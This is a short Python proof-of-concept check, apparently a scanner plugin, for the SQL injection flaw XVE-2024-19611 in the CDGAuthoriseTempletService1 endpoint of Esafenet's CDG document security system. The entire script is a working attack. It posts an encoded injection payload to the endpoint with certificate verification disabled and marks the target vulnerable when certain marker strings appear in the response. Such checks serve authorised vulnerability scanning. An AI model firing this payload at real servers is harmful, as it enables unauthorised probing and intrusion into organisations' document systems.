import requests
import urllib

def verify(url):
    relsult = {
        'name': '亿赛通电子文档安全管理系统CDGAuthoriseTempletService1存在SQL注入漏洞(XVE-2024-19611)',
        'vulnerable': False,
        'url': url
    }
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2227.0 Safari/537.36",
        "Content-Type": "application/xml"
    }
    data = "CGKFAICMPFGICCPHKFGGGBOMICMOKOBGPCBLKPCAHAGPFJHFABCPPKIOHIAIBJLLHJCODJMAGKBGIKDAFJHJMMKBDHABAJPBFNLBOIDFBHMMFKFHLPIAOPHEOAICJEMBCKFEIPGINHHBEGDOMEOPDKJGPNIJEDNOMEKLJHCGOJCEIPFPEDGBEHJLMNEEFIKFPGCCKCFCCOMONKACOEENLFIBAGNJBLHDEJCIPHOPDOAMGLINIEJDIFOLLGEDIDMDJAFOOFLNONAODEHAOEOGNEODKCOMDHBCFNPABIFOJJMOAABAPPFOFKBJMFFECMPBEEABGMMHLFAMKELPIEKDIOLJBAEFJHFMGNCLFOHPGKMOALGNKIPEDBEANAIMMLHKFLFOMIAFFCNHGBBDOCBDIONABHPKGCFFFOGCFKGPFAEAFCFJGHFEFOGOCB"
    vurl = urllib.parse.urljoin(url, "/CDGServer3/CDGAuthoriseTempletService1")
    try:
        response = requests.post(vurl, headers=headers, data=data, verify=False)
        if response.status_code == 200 and 'FEPCCC' in response.text and 'MEOGCAKA' in response.text:
            relsult['vulnerable'] = True
            relsult['verify'] = vurl
        return relsult

    except:
        return relsult